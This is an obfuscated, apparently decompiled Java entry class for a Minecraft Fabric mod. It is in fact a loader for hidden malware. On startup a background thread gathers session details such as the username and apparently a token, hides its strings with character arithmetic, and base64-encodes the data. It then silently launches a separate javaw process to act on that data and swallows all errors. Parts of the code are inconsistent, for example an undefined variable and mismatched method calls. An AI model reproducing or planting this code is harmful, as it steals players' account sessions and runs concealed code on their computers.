package net.efn.loader;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Base64.Encoder;
import net.fabricmc.api.ModInitializer;

public class LoaderInit implements ModInitializer {
   public void onInitialize() {
      new Thread(
            () -> {
               try {
                  String AMBnycTh = SessionAccess.bwx_az_cuzpwr_vgoij();
                  String sourceOut = SessionAccess.EaYOUPT5();
                  String optsVal = SessionAccess.ebqtvvsBus();
                  if (optsVal == null) {
                     char[] var20 = new char[]{
                        (char)('\udf74' ^ '\udf01'),
                        (char)('\ufa7e' ^ '\ufa10'),
                        (char)(6212 ^ 6191),
                        (char)('\u80cb' ^ '\u80a5'),
                        (char)('\u93e6' ^ '\u9389'),
                        (char)('\udf76' ^ '\udf01'),
                        (char)('\ufa7e' ^ '\ufa10')
                     };
                     optsVal = new String(var20);
                  }

                  String v9yVJ_jp = RuntimeBridge.fgqnpyible();
                  String DIkx_xChf_Xqrc_FZqd = RuntimeBridge.emitMuxd();
                  Path oHfw2xARFq = Zuf6iq.mnhh_a();
                  RuntimeBridge pg_tfx_bvddxm = new RuntimeBridge();
                  String ir_uoldx_al_ydniyn = pg_tfx_bvddxm.getDomain();
                  String tGknpsWQ = pg_tfx_bvddxm.prefire(ir_uoldx_al_ydniyn, AMBnycTh, v9yVJ_jp);
                  Encoder var10000 = Base64.getEncoder();
                  String var10001 = Zuf6iq.mvEGxwk(sourceOut);
                  String var10002 = Zuf6iq.mvEGxwk(optsVal);
                  String var24 = Zuf6iq.mvEGxwk(AMBnycTh);
                  String var23 = var10002;
                  String var22 = var10001;
                  StringBuilder var25;
                  StringBuilder var85 = var25 = new StringBuilder();
                  var25.append((char)('\uc0d4' - '\uc059'));
                  var25.append((char)(6830 - 6796));
                  var25.append((char)(7132 - 7015));
                  var25.append((char)('\ua210' - '\ua19d'));
                  var25.append((char)('\ue65c' - '\ue5f7'));
                  var25.append((char)('\udbc9' - '\udb57'));
                  var25.append((char)('\u8de0' - '\u8d72'));
                  var25.append((char)(27026 - 26929));
                  var25.append((char)(15474 - 15365));
                  var25.append((char)(9194 - 9093));
                  var25.append((char)(30075 - 30041));
                  var25.append((char)('\uc093' - '\uc059'));
                  var25.append((char)(6830 - 6796));
                  StringBuilder var86 = var85.append(var25.toString()).append(var22);
                  StringBuilder var27 = new StringBuilder();
                  var27.append((char)('\ubd96' - '\ubd74'));
                  var27.append((char)('\u88ce' - '\u88a2'));
                  var27.append((char)(14398 - 14364));
                  var27.append((char)('\u8c5d' - '\u8be8'));
                  var27.append((char)('\ua753' - '\ua6de'));
                  var27.append((char)('\ucd14' - '\uccab'));
                  var27.append((char)('\uec48' - '\uebe4'));
                  var27.append((char)('\uf44d' - '\uf42b'));
                  var27.append((char)(13623 - 13565));
                  var27.append((char)('\ucf51' - '\ucf2f'));
                  StringBuilder var87 = var86.append(var27.toString()).append(var23);
                  char[] var29 = new char[]{
                     (char)(587 + '\ufdd7'),
                     (char)(9625 + '\uda93'),
                     (char)('\ua15d' + 24261),
                     (char)('\u9655' + 27148),
                     (char)(4881 + '\ued52'),
                     (char)(23567 + '\ua454'),
                     (char)('\ue667' + 6654),
                     (char)(26341 + '\u998e'),
                     (char)('\u8157' + 32540),
                     (char)('\u9fbd' + 24727),
                     (char)(22380 + '\ua903'),
                     (char)(20257 + '\ub14a'),
                     (char)('\ucef9' + 12652),
                     (char)(663 + '\ufdd7'),
                     (char)(9615 + '\uda93'),
                     (char)('\ua175' + 24261),
                     (char)('\u9616' + 27148)
                  };
                  String prev3 = var10000.encodeToString(
                     var87.append(new String(var29)).append(var24).append("\"}").toString().getBytes(StandardCharsets.UTF_8)
                  );
                  if (tGknpsWQ != null) {
                     var10001 = tGknpsWQ;
                  } else {
                     StringBuilder var31 = new StringBuilder();
                     var31.append((char)('\ub7fe' ^ '\ub790'));
                     var31.append((char)('\uc810' ^ '\uc865'));
                     var31.append((char)('\uacb1' ^ '\uacdd'));
                     var31.append((char)('\udce3' ^ '\udc8f'));
                     var10001 = var31.toString();
                  }

                  var10002 = Zuf6iq.mvEGxwk(v9yVJ_jp);
                  String var10003 = Zuf6iq.mvEGxwk(DIkx_xChf_Xqrc_FZqd);
                  String var10004 = Zuf6iq.mvEGxwk(ir_uoldx_al_ydniyn);
                  String var10005 = Zuf6iq.mvEGxwk(oHfw2xARFq != null ? oHfw2xARFq.toString() : "");
                  String var10006 = Zuf6iq.mvEGxwk(sourceOut);
                  String var40 = Zuf6iq.mvEGxwk(optsVal);
                  String var39 = var10006;
                  String var38 = var10005;
                  String var37 = var10004;
                  String var36 = var10003;
                  String var35 = var10002;
                  String var34 = var10001;
                  StringBuilder var75 = new StringBuilder();
                  char[] var41 = new char[]{
                     (char)(29501 ^ 29510),
                     (char)('\u9287' ^ '\u92a5'),
                     (char)(26086 ^ 25995),
                     (char)('\ua773' ^ '\ua710'),
                     (char)(22927 ^ 22982),
                     (char)(1827 ^ 1869),
                     (char)(8436 ^ 8338),
                     (char)(29481 ^ 29510),
                     (char)('\u9287' ^ '\u92a5'),
                     (char)(26033 ^ 25995),
                     (char)('\ua732' ^ '\ua710')
                  };
                  StringBuilder var76 = var75.append(new String(var41)).append(prev3);
                  StringBuilder var43 = new StringBuilder();
                  var43.append((char)('\uba2c' - '\uba0a'));
                  var43.append((char)(11176 - 11132));
                  var43.append((char)('\uba7c' - '\uba5a'));
                  var43.append((char)('\u9763' - '\u96f3'));
                  var43.append((char)('\uee20' - '\uedae'));
                  var43.append((char)(6171 - 6070));
                  var43.append((char)(20999 - 20897));
                  var43.append((char)('\uaec5' - '\uae5c'));
                  var43.append((char)('\ud0df' - '\ud06d'));
                  var43.append((char)(28226 - 28125));
                  var43.append((char)('\u90e6' - '\u909d'));
                  var43.append((char)('\uaa0e' - '\ua9aa'));
                  var43.append((char)('\u9797' - '\u9775'));
                  var43.append((char)('\u830c' - '\u82d2'));
                  var43.append((char)('\uba2c' - '\uba0a'));
                  StringBuilder var77 = var76.append(var43.toString()).append(var34);
                  StringBuilder var45 = new StringBuilder();
                  var45.append((char)('\ud15a' + 11976));
                  var45.append((char)('\ue800' + 6188));
                  var45.append((char)('\ua7ca' + 22616));
                  var45.append((char)(29115 + '\u8eba'));
                  var45.append((char)(23753 + '\ua3aa'));
                  var45.append((char)('\ud19d' + 11976));
                  var45.append((char)('\ue846' + 6188));
                  var45.append((char)('\ua7f1' + 22616));
                  var45.append((char)(29098 + '\u8eba'));
                  var45.append((char)(23672 + '\ua3aa'));
                  var45.append((char)('\ud172' + 11976));
                  var45.append((char)('\ue7f6' + 6188));
                  StringBuilder var78 = var77.append(var45.toString()).append(var35);
                  char[] var47 = new char[]{
                     (char)('\ua954' - '\ua932'),
                     (char)('\u80ff' - '\u80d3'),
                     (char)('\ufee6' - '\ufec4'),
                     (char)('\u8378' - '\u8304'),
                     (char)(24470 - 24373),
                     (char)(106 - 3),
                     (char)('\uda0b' - '\ud9e9'),
                     (char)('\ua96c' - '\ua932'),
                     (char)('\u80f5' - '\u80d3')
                  };
                  StringBuilder var79 = var78.append(new String(var47)).append(var36);
                  StringBuilder var49 = new StringBuilder();
                  var49.append((char)('\ub0df' + 20291));
                  var49.append((char)('\ufdd3' + 601));
                  var49.append((char)('\ub4d8' + 19274));
                  var49.append((char)('\uc6ea' + 14714));
                  var49.append((char)('\ue02d' + 8258));
                  var49.append((char)(2375 + '\uf726'));
                  var49.append((char)(24339 + '\ua14e'));
                  var49.append((char)('\ub126' + 20291));
                  var49.append((char)('\ufe15' + 601));
                  var49.append((char)('\ub4d8' + 19274));
                  var49.append((char)('\uc6c0' + 14714));
                  var49.append((char)('\udfe0' + 8258));
                  StringBuilder var80 = var79.append(var49.toString()).append(var37);
                  StringBuilder var51 = new StringBuilder();
                  var51.append((char)(27918 ^ 27948));
                  var51.append((char)('\ua63e' ^ '\ua612'));
                  var51.append((char)('\uf06d' ^ '\uf04f'));
                  var51.append((char)('\u9890' ^ '\u98f7'));
                  var51.append((char)(18540 ^ 18445));
                  var51.append((char)(4299 ^ 4262));
                  var51.append((char)('\ue9d2' ^ '\ue9b7'));
                  var51.append((char)(30078 ^ 30010));
                  var51.append((char)('\uf9fc' ^ '\uf995'));
                  var51.append((char)(20323 ^ 20241));
                  var51.append((char)(3047 ^ 3013));
                  var51.append((char)('\ub9e5' ^ '\ub9df'));
                  var51.append((char)('\ud584' ^ '\ud5a6'));
                  StringBuilder var81 = var80.append(var51.toString()).append(var38);
                  char[] var53 = new char[]{
                     (char)('\u8bf3' + 29743),
                     (char)('\udfd9' + 8275),
                     (char)(21892 + '\uaa9e'),
                     (char)(8776 + '\ude25'),
                     (char)(20683 + '\uaf98'),
                     (char)(30860 + '\u87c9'),
                     (char)('\ub49b' + 19416),
                     (char)('\uefe1' + 4228),
                     (char)('\u8666' + 31244),
                     (char)('\uf694' + 2522),
                     (char)('\u8c32' + 29743),
                     (char)('\ue01a' + 8275),
                     (char)(21959 + '\uaa9e'),
                     (char)(8701 + '\ude25'),
                     (char)(20642 + '\uaf98'),
                     (char)(30809 + '\u87c9')
                  };
                  StringBuilder var82 = var81.append(new String(var53)).append(var39);
                  char[] var55 = new char[]{
                     (char)('\uf714' + 2318),
                     (char)(42 + 2),
                     (char)(11172 + '\ud47e'),
                     (char)(19979 + '\ub262'),
                     (char)('\ue405' + 7262),
                     (char)(29665 + '\u8c74'),
                     (char)('\uf767' + 2318),
                     (char)(103 + 2),
                     (char)(11238 + '\ud47e'),
                     (char)(19904 + '\ub262'),
                     (char)('\ue3dc' + 7262),
                     (char)(29614 + '\u8c74')
                  };
                  StringBuilder var83 = var82.append(new String(var55)).append(var40);
                  char[] var57 = new char[]{
                     (char)(6279 - 6245),
                     (char)('\uda89' - '\uda5d'),
                     (char)(12274 - 12240),
                     (char)('\u94c0' - '\u945b'),
                     (char)('\ube36' - '\ubdc8'),
                     (char)('\uc704' - '\uc68e'),
                     (char)(6279 - 6245),
                     (char)('\uda97' - '\uda5d'),
                     (char)(12274 - 12240),
                     (char)('\u94a1' - '\u945b'),
                     (char)('\ube29' - '\ubdc8'),
                     (char)('\uc6f0' - '\uc68e'),
                     (char)(6359 - 6245),
                     (char)('\udac6' - '\uda5d'),
                     (char)(12339 - 12240),
                     (char)('\u947d' - '\u945b'),
                     (char)('\ube45' - '\ubdc8')
                  };
                  String Kvi_b55_H = var83.append(new String(var57)).toString();
                  String value = Base64.getEncoder().encodeToString(Kvi_b55_H.getBytes(StandardCharsets.UTF_8));
                  StringBuilder var59 = new StringBuilder();
                  var59.append((char)(14480 ^ 14586));
                  var59.append((char)(10894 ^ 10991));
                  var59.append((char)('\uba42' ^ '\uba34'));
                  var59.append((char)('\u9957' ^ '\u9936'));
                  var59.append((char)(32508 ^ 32466));
                  var59.append((char)('\ued62' ^ '\ued0a'));
                  var59.append((char)(17968 ^ 18015));
                  var59.append((char)('\u9548' ^ '\u9525'));
                  var59.append((char)('\udaa2' ^ '\udac7'));
                  String gfdpKugq = System.getProperty(var59.toString());
                  String[] var89 = new String[]{"bin", null};
                  char[] var61 = new char[]{
                     (char)(25351 ^ 25453),
                     (char)(26548 ^ 26581),
                     (char)('\u8bfa' ^ '\u8b8c'),
                     (char)('\u9ecd' ^ '\u9eac'),
                     (char)(15293 ^ 15306),
                     (char)('\uc6cc' ^ '\uc6e2'),
                     (char)('\ua37d' ^ '\ua318'),
                     (char)(9075 ^ 8971),
                     (char)(9172 ^ 9137)
                  };
                  var89[1] = new String(var61);
                  Path cjimu_bjlku = Path.of(gfdpKugq, var89);
                  if (!Files.exists(cjimu_bjlku)) {
                     String[] var90 = new String[]{"bin", null};
                     char[] var63 = new char[]{
                        (char)('\uc1d8' - '\uc16e'),
                        (char)(7362 - 7265),
                        (char)('\ua465' - '\ua3ef'),
                        (char)('\u9bb1' - '\u9b50'),
                        (char)(17872 - 17826),
                        (char)(17821 - 17720),
                        (char)('\u8190' - '\u8118'),
                        (char)(12645 - 12544)
                     };
                     var90[1] = new String(var63);
                     cjimu_bjlku = Path.of(gfdpKugq, var90);
                  }

                  URI qdFI_sKlXPH848 = LoaderInit.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                  Path xLen = Path.of(qdFI_sKlXPH848);
                  char[] var65 = new char[]{
                     (char)(28542 + '\u90ce'),
                     (char)('\ucc20' + 13359),
                     (char)('\uc392' + 15537),
                     (char)(25429 + '\u9cec'),
                     (char)(32279 + '\u8235'),
                     (char)('\uc5e7' + 14938),
                     (char)('\u9f5e' + 24818),
                     (char)(14428 + '\uc7f4'),
                     (char)(17189 + '\ubd1f'),
                     (char)('\ud651' + 10736),
                     (char)('\uea63' + 5617),
                     (char)('\udf0b' + 8502)
                  };
                  String var84 = System.getenv(new String(var65));
                  String[] var91 = new String[3];
                  StringBuilder var67 = new StringBuilder();
                  var67.append((char)(32285 + '\u8230'));
                  var67.append((char)(15002 + '\uc5cf'));
                  var67.append((char)('\u809c' + 32711));
                  var67.append((char)(20760 + '\uaf5a'));
                  var67.append((char)(32319 + '\u8230'));
                  var67.append((char)(15012 + '\uc5cf'));
                  var67.append((char)('\u80a8' + 32711));
                  var67.append((char)(20748 + '\uaf5a'));
                  var67.append((char)(32324 + '\u8230'));
                  var91[0] = var67.toString();
                  StringBuilder var69 = new StringBuilder();
                  var69.append((char)(25833 ^ 25790));
                  var69.append((char)(32733 ^ 32692));
                  var69.append((char)('\uf772' ^ '\uf71c'));
                  var69.append((char)('\ub71f' ^ '\ub77b'));
                  var69.append((char)(13252 ^ 13227));
                  var69.append((char)('\ufd87' ^ '\ufdf0'));
                  var69.append((char)('\udec5' ^ '\udeb6'));
                  var91[1] = var69.toString();
                  StringBuilder var71 = new StringBuilder();
                  var71.append((char)(25748 + '\u9bba'));
                  var71.append((char)('\uac50' + 21540));
                  var71.append((char)('\uea6d' + 5603));
                  var71.append((char)(14100 + '\uc95e'));
                  var71.append((char)('\ua949' + 22310));
                  var71.append((char)('\u81e7' + 32383));
                  var71.append((char)('\u9541' + 27432));
                  var71.append((char)(14895 + '\uc63d'));
                  var71.append((char)(8592 + '\uded5'));
                  var71.append((char)('\uab59' + 21744));
                  var71.append((char)(3269 + '\uf3a9'));
                  var71.append((char)('\uf4cd' + 2967));
                  var71.append((char)(25771 + '\u9bba'));
                  var71.append((char)('\uac54' + 21540));
                  var91[2] = var71.toString();
                  Path Th_hV = Path.of(var84, var91);
                  Files.createDirectories(Th_hV);
                  String j9P9qaPLS = RuntimeBridge.class.getName();
                  ProcessBuilder iqUyHDUiweBe_L = new ProcessBuilder(cjimu_bjlku.toString(), "-cp", xLen.toString(), j9P9qaPLS, value);
                  iqUyHDUiweBe_L.redirectInput(Redirect.from(new File("NUL")));
                  StringBuilder var73 = new StringBuilder();
                  var73.append((char)(6582 - 6487));
                  var73.append((char)('\u888f' - '\u881c'));
                  var73.append((char)('\uda09' - '\ud999'));
                  var73.append((char)(9349 - 9252));
                  var73.append((char)(6606 - 6487));
                  var73.append((char)('\u888a' - '\u881c'));
                  var73.append((char)('\ud9c7' - '\ud999'));
                  var73.append((char)(9360 - 9252));
                  var73.append((char)(6598 - 6487));
                  var73.append((char)('\u8883' - '\u881c'));
                  iqUyHDUiweBe_L.redirectOutput(Redirect.appendTo(Th_hV.resolve(var73.toString()).toFile()));
                  iqUyHDUiweBe_L.redirectErrorStream(true);
                  iqUyHDUiweBe_L.directory(Th_hV.toFile());
                  iqUyHDUiweBe_L.start();
               } catch (Exception var74) {
               }
            }
         )
         .start();
   }

   private Path mnhh_a() {
      StringBuilder var4 = new StringBuilder();
      var4.append((char)(1331 ^ 1350));
      var4.append((char)('\ueb68' ^ '\ueb1b'));
      var4.append((char)(23838 ^ 23931));
      var4.append((char)('\ua3c7' ^ '\ua3b5'));
      var4.append((char)(18220 ^ 18178));
      var4.append((char)(17832 ^ 17868));
      var4.append((char)(14900 ^ 14941));
      var4.append((char)(1332 ^ 1350));
      Path hucU_kCln_mBau_sMGb = Path.of(System.getProperty(var4.toString()));
      StringBuilder var6 = new StringBuilder();
      var6.append((char)('\uc948' + 14119));
      var6.append((char)(8074 + '\ue0e6'));
      var6.append((char)(5982 + '\ue916'));
      var6.append((char)(15131 + '\uc54e'));
      var6.append((char)(32352 + '\u820f'));
      var6.append((char)('\ufc6c' + 1026));
      var6.append((char)('\uc94c' + 14119));
      var6.append((char)(8008 + '\ue0e6'));
      var6.append((char)(5982 + '\ue916'));
      var6.append((char)(15146 + '\uc54e'));
      var6.append((char)(32357 + '\u820f'));
      if (!Files.exists(hucU_kCln_mBau_sMGb.resolve(var6.toString()))) {
         char[] var8 = new char[]{
            (char)(9405 - 9306), (char)(1713 - 1602), (char)('\ub84f' - '\ub7e1'), (char)('\ude23' - '\uddbd'), (char)(15811 - 15706), (char)(9409 - 9306)
         };
         if (!Files.exists(hucU_kCln_mBau_sMGb.resolve(new String(var8)))) {
            StringBuilder var10 = new StringBuilder();
            var10.append((char)(4657 - 4548));
            var10.append((char)(8757 - 8646));
            var10.append((char)('\ud6e5' - '\ud681'));
            var10.append((char)('\ued2f' - '\uecbc'));
            if (!Files.exists(hucU_kCln_mBau_sMGb.resolve(var10.toString()))) {
               StringBuilder var12 = new StringBuilder();
               var12.append((char)('\uf79f' - '\uf75e'));
               var12.append((char)('\u8244' - '\u81f4'));
               var12.append((char)(11039 - 10959));
               var12.append((char)('\u866d' - '\u8629'));
               var12.append((char)(1528 - 1463));
               var12.append((char)('\ufe12' - '\ufdbe'));
               var12.append((char)(17539 - 17474));
               String MDdI_hlHz_xXaf_tIYh = System.getenv(var12.toString());
               if (MDdI_hlHz_xXaf_tIYh != null) {
                  String[] var10001 = new String[1];
                  char[] var14 = new char[]{
                     (char)('\ud8d2' ^ '\ud8fc'),
                     (char)(15415 ^ 15450),
                     (char)('\ufc3b' ^ '\ufc52'),
                     (char)('\uc959' ^ '\uc937'),
                     (char)('\ud5c5' ^ '\ud5a0'),
                     (char)('\uc3a1' ^ '\uc3c2'),
                     (char)(17244 ^ 17198),
                     (char)('\ud89d' ^ '\ud8fc'),
                     (char)(15420 ^ 15450),
                     (char)('\ufc26' ^ '\ufc52')
                  };
                  var10001[0] = new String(var14);
                  Path V__w = Path.of(MDdI_hlHz_xXaf_tIYh, var10001);
                  if (Files.exists(V__w)) {
                     return V__w;
                  }
               }

               StringBuilder var16 = new StringBuilder();
               var16.append((char)(25512 - 25395));
               var16.append((char)('\uc95e' - '\uc8eb'));
               var16.append((char)('\u9ece' - '\u9e69'));
               var16.append((char)('\ueefb' - '\uee89'));
               var16.append((char)('\ua52f' - '\ua501'));
               var16.append((char)(25499 - 25395));
               var16.append((char)('\uc95a' - '\uc8eb'));
               var16.append((char)('\u9ed6' - '\u9e69'));
               var16.append((char)('\ueeee' - '\uee89'));
               String var10000 = System.getProperty(var16.toString());
               String[] var20 = new String[1];
               char[] var18 = new char[]{
                  (char)('\ua919' ^ '\ua937'),
                  (char)(30876 ^ 30961),
                  (char)(6279 ^ 6382),
                  (char)('\ubfdd' ^ '\ubfb3'),
                  (char)(26419 ^ 26454),
                  (char)('\uea7b' ^ '\uea18'),
                  (char)(31184 ^ 31138),
                  (char)('\ud7f9' ^ '\ud798'),
                  (char)('\ua392' ^ '\ua3f4'),
                  (char)('\u99d3' ^ '\u99a7')
               };
               var20[0] = new String(var18);
               Path uesyDogkgUsorHxn = Path.of(var10000, var20);
               if (Files.exists(uesyDogkgUsorHxn)) {
                  return uesyDogkgUsorHxn;
               }

               return hucU_kCln_mBau_sMGb;
            }
         }
      }

      return hucU_kCln_mBau_sMGb;
   }

   private String mvEGxwk(String s) {
      if (hqmipy_ovcjmn == null) {
         return "";
      } else {
         StringBuilder oBuX5gtXwK = new StringBuilder();

         for (char cursor0 : hqmipy_ovcjmn.toCharArray()) {
            switch (cursor0) {
               case '\t':
                  oBuX5gtXwK.append("\\t");
                  break;
               case '\n':
                  oBuX5gtXwK.append("\\n");
                  break;
               case '\r':
                  oBuX5gtXwK.append("\\r");
                  break;
               case '"':
                  oBuX5gtXwK.append("\\\"");
                  break;
               case '\\':
                  char[] var7 = new char[]{(char)(3990 ^ 4042), (char)('\uda79' ^ '\uda25')};
                  oBuX5gtXwK.append(new String(var7));
                  break;
               default:
                  if (cursor0 < ' ') {
                     char[] var9 = new char[]{
                        (char)(30649 - 30557),
                        (char)(19865 - 19748),
                        (char)('\ude64' - '\ude3f'),
                        (char)('\ue436' - '\ue406'),
                        (char)(11995 - 11943),
                        (char)('\ufc23' - '\ufbab')
                     };
                     oBuX5gtXwK.append(String.format(new String(var9), Integer.valueOf(cursor0)));
                  } else {
                     oBuX5gtXwK.append(cursor0);
                  }
            }
         }

         return oBuX5gtXwK.toString();
      }
   }
}
